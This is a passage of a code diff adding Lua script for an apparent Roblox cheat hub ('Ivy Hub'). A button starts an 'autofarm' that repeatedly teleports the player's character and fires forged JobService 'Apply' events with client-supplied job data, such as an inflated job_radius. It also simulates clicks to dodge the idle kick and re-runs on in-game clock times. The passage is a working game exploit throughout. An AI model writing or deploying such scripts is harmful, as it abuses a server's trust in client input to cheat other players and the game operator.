+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+        wait(.1)
+        game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+        game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+        wait(.1)
+        
+    
+    
+        if ReplicatedStorage.Scenes.Interiors:FindFirstChild("Key Resource Employment Office") then
+            ReplicatedStorage.Scenes.Interiors:FindFirstChild("Key Resource Employment Office").Parent = workspace.Interiors
+        end
+        wait(1)
+    
+        local Arguments1 = {
+            [1] = "GiveGui"
+            }
+    
+        game:GetService("ReplicatedStorage").Events.JobService:FireServer(unpack(Arguments1))
+        
+        wait(1)
+    
+        local Arguments2 = {
+             [1] = "Apply",
+             [2] = {
+            ["job_radius"] = 60,
+            ["CanWork"] = true,
+            ["indoor_job_point"] = workspace.JobPoints.Litfits,
+            ["Workers"] = {},
+            ["ID"] = "LitFits",
+            ["job_point"] = workspace.JobPoints.LitfitsInterior,
+            ["MaxPositions"] = 3,
+            ["Data"] = {
+                ["HourReqirement"] = 0,
+                ["EndTime"] = "22:00:00",
+                ["Shiftless"] = false,
+                ["JobDesc"] = "Sell clothes to customers. Very simple.",
+                ["JobTitle"] = "LitFits Clerk",
+                ["RequiredConstantWork"] = true,
+                ["UniformShirt"] = 198707189,
+                ["UniformPants"] = 3127805122,
+                ["Commission"] = 0,
+                ["StartTime"] = "08:00:00",
+                ["BasePay"] = 200,
+                ["JobRules"] = "Make sure customers do not shoplift, and check them out when purchasing clothing. Help the customer find the right size if needed."
+            }
+          }
+        }
+    
+        game:GetService("ReplicatedStorage").Events.JobService:FireServer(unpack(Arguments2))
+    
+        wait(1)
+    
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1999.5096435546875, -244.62509155273438, 24.730424880981445)
+        wait(.1)
+        game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+        game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1993.15918, -232.800003, 13.1611395, -0.485701829, 0, -0.874124587, 0, 1, 0, 0.874124587, 0, -0.485701829)
+        wait(.1)
+        game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+        game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1993.15918, -232.800003, 13.1611395, -0.485701829, 0, -0.874124587, 0, 1, 0, 0.874124587, 0, -0.485701829)
+        wait(.1)
+        game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+        game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+        Wait(.1)
+        game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+        game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1993.15918, -232.800003, 13.1611395, -0.485701829, 0, -0.874124587, 0, 1, 0, 0.874124587, 0, -0.485701829)
+        wait(.1)
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1999.5096435546875, -244.62509155273438, 24.730424880981445)
+        wait(.1)
+        game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+        game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1993.15918, -232.800003, 13.1611395, -0.485701829, 0, -0.874124587, 0, 1, 0, 0.874124587, 0, -0.485701829)
+        wait(.1)
+        game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+        game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1993.15918, -232.800003, 13.1611395, -0.485701829, 0, -0.874124587, 0, 1, 0, 0.874124587, 0, -0.485701829)
+        wait(.1)
+        game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+        game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+        Wait(.1)
+        game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+        game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1993.15918, -232.800003, 13.1611395, -0.485701829, 0, -0.874124587, 0, 1, 0, 0.874124587, 0, -0.485701829)
+    
+        if ReplicatedStorage.Scenes.Interiors:FindFirstChild("Lit Fits") then
+            ReplicatedStorage.Scenes.Interiors:FindFirstChild("Lit Fits").Parent = workspace.Interiors
+        end
+    end
+    
+        
+    
+    Start()
+    
+    local function SendMessage(message)
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
+        local ChatModule = require(game.Players.LocalPlayer.PlayerScripts.ChatScript.ChatMain)
+        ChatModule.MessagePosted:fire(message);
+    end
+    
+    local vu = game:GetService("VirtualUser")
+    game:GetService("Players").LocalPlayer.Idled:connect(function()
+       vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+       wait(1)
+       vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+    end)
+     
+    print("Loading #1")
+     
+    local function Start1()
+        SendMessage("/quitjob")
+        wait(2)
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+        wait(.1)
+        game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+        game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+        wait(.1)
+        game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+        game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+        wait(.1)
+        game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+        game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+        wait(.1)
+        game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+        game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+        wait(.1)
+        game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+        game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+        wait(.1)
+        game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+        game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+        
+     
+        wait(.1)
+     
+        local A_1 = "GiveGui"
+        local Event = game:GetService("ReplicatedStorage").Events.JobService
+        Event:FireServer(A_1)
+     
+        wait(.1)
+     
+        local A_1 = "Apply"
+        local A_2 = 
+        {
+            ["job_radius"] = 20000, 
+            ["CanWork"] = true, 
+            ["indoor_job_point"] = game:GetService("Workspace").JobPoints.TheaterInterior, 
+            ["Workers"] = 
+        {
+        }, 
+            ["ID"] = "MovieActor", 
+            ["job_point"] = game:GetService("Workspace").JobPoints.Theater, 
+            ["MaxPositions"] = 4, 
+            ["Data"] = 
+        {
+            ["HourReqirement"] = 2, 
+            ["EndTime"] = "23:00:00", 
+            ["Shiftless"] = false, 
+            ["JobDesc"] = "Roleplay improv scenarios to give a show to the audience. Dress in costumes and use props to convey a playscript with a unique twist of your own flavor!", 
+            ["JobTitle"] = "Actor", 
+            ["RequiredConstantWork"] = false, 
+            ["UniformShirt"] = 6401487262, 
+            ["UniformPants"] = 7442991927, 
+            ["Commission"] = 0, 
+            ["StartTime"] = "17:00:00", 
+            ["BasePay"] = 450, 
+            ["JobRules"] = "Use the door in the theater room to enter the backstage, from there follow the prompts and pick your costume, and make sure your team roleplays according to the script. Use /me to roleplay actions (ex: /me picks up the rock.)"
+        }
+        }
+        local Event = game:GetService("ReplicatedStorage").Events.JobService
+        Event:FireServer(A_1, A_2)
+    wait(.1)
+     
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(249, 16, 59)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(249, 16, 59)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(249, 16, 59)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(249, 16, 59)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(249, 16, 59)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(249, 16, 59)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(249, 16, 59)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(249, 16, 59)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(249, 16, 59)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(249, 16, 59)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    
+    end
+     
+    
+     
+    local function Check()
+        if game:GetService("Lighting").ClockTime == 23 then
+            print("Restarting")
+            Start()
+        end
+    end
+
+    game:GetService("Lighting"):GetPropertyChangedSignal("ClockTime"):Connect(Check)
+    
+    local function Check1()
+        if game:GetService("Lighting").ClockTime == 17 then
+            print("Restarting")
+            Start1()
+        end
+    end
+    
+    game:GetService("Lighting"):GetPropertyChangedSignal("ClockTime"):Connect(Check1)
+    
+end)
+
+Section2:CreateButton("LaFancy and Actor", function ()
+    game.StarterGui:SetCore("SendNotification", {Title = "Ivy Hub", Text = "starting autofarm...", Icon = "rbxassetid://14445651728", Duration = 3,})
+    wait(1)
+    local Player = game.Players.LocalPlayer
+local Character = Player.Character
+local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+
+local function SendMessage(message)
+    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
+    local ChatModule = require(game.Players.LocalPlayer.PlayerScripts.ChatScript.ChatMain)
+    ChatModule.MessagePosted:fire(message);
+end
+
+local function Start()
+    SendMessage("/quitjob")
+    wait(2)
+   game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    
+
+
+    if ReplicatedStorage.Scenes.Interiors:FindFirstChild("Key Resource Employment Office") then
+        ReplicatedStorage.Scenes.Interiors:FindFirstChild("Key Resource Employment Office").Parent = workspace.Interiors
+    end
+    wait(1)
+
+    local Arguments1 = {
+        [1] = "GiveGui"
+        }
+
+    game:GetService("ReplicatedStorage").Events.JobService:FireServer(unpack(Arguments1))
+    
+    wait(1)
+
+    local Arguments2 = {
+         [1] = "Apply",
+         [2] = {
+        ["job_radius"] = 60,
+        ["CanWork"] = true,
+        ["indoor_job_point"] = workspace.JobPoints.LaFancy,
+        ["Workers"] = {},
+        ["ID"] = "LaFancy",
+        ["job_point"] = workspace.JobPoints.LaFancyInterior,
+        ["MaxPositions"] = 3,
+        ["Data"] = {
+            ["HourReqirement"] = 0,
+            ["EndTime"] = "18:00:00",
+            ["Shiftless"] = false,
+            ["JobDesc"] = "Sell clothes to customers. Very simple.",
+            ["JobTitle"] = "LaFancy Clerk",
+            ["RequiredConstantWork"] = true,
+            ["UniformShirt"] = 479749640,
+            ["UniformPants"] = 479749688,
+            ["Commission"] = 0,
+            ["StartTime"] = "07:00:00",
+            ["BasePay"] = 225,
+            ["JobRules"] = "Make sure customers do not shoplift, and check them out when purchasing clothing. Help the customer find the right size if needed."
+        }
+      }
+    }
+
+    game:GetService("ReplicatedStorage").Events.JobService:FireServer(unpack(Arguments2))
+
+    wait(1)
+
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2019.00586, -268.025238, 267.637817, -0.696737528, 0, -0.717326164, 0, 1, 0, 0.717326164, 0, -0.696737528)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2019.00586, -268.025238, 267.637817, -0.696737528, 0, -0.717326164, 0, 1, 0, 0.717326164, 0, -0.696737528)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2019.00586, -268.025238, 267.637817, -0.696737528, 0, -0.717326164, 0, 1, 0, 0.717326164, 0, -0.696737528)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    Wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2019.00586, -268.025238, 267.637817, -0.696737528, 0, -0.717326164, 0, 1, 0, 0.717326164, 0, -0.696737528)
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2019.00586, -268.025238, 267.637817, -0.696737528, 0, -0.717326164, 0, 1, 0, 0.717326164, 0, -0.696737528)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2019.00586, -268.025238, 267.637817, -0.696737528, 0, -0.717326164, 0, 1, 0, 0.717326164, 0, -0.696737528)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2019.00586, -268.025238, 267.637817, -0.696737528, 0, -0.717326164, 0, 1, 0, 0.717326164, 0, -0.696737528)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    Wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2019.00586, -268.025238, 267.637817, -0.696737528, 0, -0.717326164, 0, 1, 0, 0.717326164, 0, -0.696737528)
+
+    if ReplicatedStorage.Scenes.Interiors:FindFirstChild("La Fancy") then
+        ReplicatedStorage.Scenes.Interiors:FindFirstChild("La Fancy").Parent = workspace.Interiors
+    end
+end
+
+Start()
+
+local function SendMessage(message)
+    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
+    local ChatModule = require(game.Players.LocalPlayer.PlayerScripts.ChatScript.ChatMain)
+    ChatModule.MessagePosted:fire(message);
+end
+
+local vu = game:GetService("VirtualUser")
+game:GetService("Players").LocalPlayer.Idled:connect(function()
+   vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+   wait(1)
+   vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+end)
+ 
+print("Loading #1")
+ 
+local function Start1()
+    SendMessage("/quitjob")
+    wait(2)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(974.812988, -129.625031, 271.104584, -0.0866802335, 0, -0.996236205, 0, 1, 0, 0.996236205, 0, -0.0866802335)
+    
+ 
+    wait(.1)
+ 
+    local A_1 = "GiveGui"
+    local Event = game:GetService("ReplicatedStorage").Events.JobService
+    Event:FireServer(A_1)
+ 
+    wait(.1)
+ 
+    local A_1 = "Apply"
+    local A_2 = 
+    {
+        ["job_radius"] = 20000, 
+        ["CanWork"] = true, 
+        ["indoor_job_point"] = game:GetService("Workspace").JobPoints.TheaterInterior, 
+        ["Workers"] = 
+    {
+    }, 
+        ["ID"] = "MovieActor", 
+        ["job_point"] = game:GetService("Workspace").JobPoints.Theater, 
+        ["MaxPositions"] = 4, 
+        ["Data"] = 
+    {
+        ["HourReqirement"] = 2, 
+        ["EndTime"] = "23:00:00", 
+        ["Shiftless"] = false, 
+        ["JobDesc"] = "Roleplay improv scenarios to give a show to the audience. Dress in costumes and use props to convey a playscript with a unique twist of your own flavor!", 
+        ["JobTitle"] = "Actor", 
+        ["RequiredConstantWork"] = false, 
+        ["UniformShirt"] = 6401487262, 
+        ["UniformPants"] = 7442991927, 
+        ["Commission"] = 0, 
+        ["StartTime"] = "17:00:00", 
+        ["BasePay"] = 450, 
+        ["JobRules"] = "Use the door in the theater room to enter the backstage, from there follow the prompts and pick your costume, and make sure your team roleplays according to the script. Use /me to roleplay actions (ex: /me picks up the rock.)"
+    }
+    }
+    local Event = game:GetService("ReplicatedStorage").Events.JobService
+    Event:FireServer(A_1, A_2)
+wait(.1)
+ 
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(249, 16, 59)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(249, 16, 59)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(249, 16, 59)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(249, 16, 59)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(249, 16, 59)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(249, 16, 59)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(249, 16, 59)
+    wait(.1)
